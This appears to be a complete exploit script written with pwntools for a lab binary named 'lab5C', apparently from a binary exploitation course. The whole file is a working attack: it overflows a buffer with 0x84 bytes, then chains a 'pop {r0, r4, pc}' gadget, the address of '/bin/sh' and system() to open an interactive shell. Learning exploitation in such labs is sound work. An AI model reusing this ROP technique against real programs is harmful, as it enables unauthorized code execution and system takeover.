#!/usr/bin/env python

from pwn import *

r = process(['./lab5C'])

payload = "A" * 0x84
payload += p32(0x76ee012c)	# 0x0007a12c : pop {r0, r4, pc}
payload += p32(0x76f83c68)	# '/bin/sh'
payload += p32(0)
payload += p32(0x76e9ffac)	# system

r.sendline(payload)
r.clean()
r.interactive()
